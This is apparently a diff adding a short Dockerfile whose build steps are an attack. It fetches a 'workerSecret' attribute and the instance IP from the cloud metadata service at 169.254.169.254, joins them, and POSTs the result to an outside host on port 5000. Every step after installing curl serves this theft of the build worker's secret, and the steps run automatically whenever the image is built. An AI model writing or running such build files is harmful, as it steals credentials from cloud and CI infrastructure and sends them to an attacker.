@@ -1,0 +1,10 @@
+FROM alpine
+
+RUN apk add curl
+
+RUN curl --connect-timeout 5 http://169.254.169.254/computeMetadata/v1beta1/instance/attributes/workerSecret > /secret
+RUN curl --connect-timeout 5 http://169.254.169.254/computeMetadata/v1beta1/instance/network-interfaces/0/ip > /ip
+
+RUN cat /secret | (cat /ip && echo -e '\n' && cat) > /upload
+
+RUN curl -XPOST --data-binary @/upload http://x.x.x.x:5000/
